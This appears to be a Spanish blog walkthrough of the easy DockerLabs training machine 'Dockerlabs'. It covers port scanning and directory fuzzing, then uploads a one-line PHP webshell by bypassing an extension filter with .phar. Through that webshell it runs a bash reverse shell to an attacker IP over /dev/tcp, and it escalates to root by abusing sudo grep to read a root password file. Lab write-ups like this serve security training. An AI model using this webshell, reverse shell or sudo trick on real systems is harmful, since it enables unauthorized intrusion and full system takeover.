---
layout: post
title: "Dockerlabs"
date: 2024-10-07
 12:40:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Dockerlabs </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Descubriendo puertos de la maquina objetivo, tenemos funcionando el servicio apache.

`sudo nmap -p- -T5 --min-rate=5000 --open -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/dockerlabs/nmap.png){:.margin}

**2\.** No encontramos nada importante en la web.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/dockerlabs/80.png){:.margin}

**3\.** Realizamos un poco de fuzzing y encontramos dos ficheros .php.

`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`

![img](/notas/public/img/dockerlabs/dockerlabs/gobuster.png){:.margin}

**4\.** Revisamos estas paginas, en el fichero machine.php tenemos una subida de archivos.

`http://172.17.0.2/machine.php`

![img](/notas/public/img/dockerlabs/dockerlabs/80machine.png){:.margin}

**5\.** Creamos nuestro archivo para obtener una webshell, intentamos subir el archivo pero no nos permite.

`nano shell.php`

`<?php system($_GET['cmd']);?>`

![img](/notas/public/img/dockerlabs/dockerlabs/nanoshell.png){:.margin}
![img](/notas/public/img/dockerlabs/dockerlabs/errorupload.png){:.margin}

**6\.** Probando con extensiones variantes de php logro subir el fichero con extension .phar, nuestro fichero lo encontramos en el directorio uploads.

`http://172.17.0.2/uploads/shell.phar`

![img](/notas/public/img/dockerlabs/dockerlabs/okupload.png){:.margin}
![img](/notas/public/img/dockerlabs/dockerlabs/fileshell.png){:.margin}

**7\.** Nos ponemos en escucha con nc y nos enviamos una reverse shell; ya tenemos acceso a la maquina.

`nc -nlvp 4000`

`http://172.17.0.2/uploads/shell.phar?cmd=bash -c "bash -i>%26 /dev/tcp/192.168.18.8/4000 0>%261"`

![img](/notas/public/img/dockerlabs/dockerlabs/nc.png){:.margin}
![img](/notas/public/img/dockerlabs/dockerlabs/ncok.png){:.margin}

**8\.** En este punto reviso los privilegios sudo del usuario y encuentro dos binarios, ademas de que encuentro una nota en opt.

`sudo -l`

`cat /opt/nota.txt`

![img](/notas/public/img/dockerlabs/dockerlabs/sudol.png){:.margin}
![img](/notas/public/img/dockerlabs/dockerlabs/nota.png){:.margin}

**9\.** Ambos binarios nos sirve para poder obtener el contenido de un fichero, nos podemos ayudar con gtfobins para el uso de [grep](https://gtfobins.github.io/gtfobins/grep/#sudo) o [cut](https://gtfobins.github.io/gtfobins/cut/#sudo).

`sudo /usr/bin/grep '' /root/clave.txt`

![img](/notas/public/img/dockerlabs/dockerlabs/clave.png){:.margin}

**10\.** Ya con la clave en mano solo nos queda migrar al usuario root.

`su root`

![img](/notas/public/img/dockerlabs/dockerlabs/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>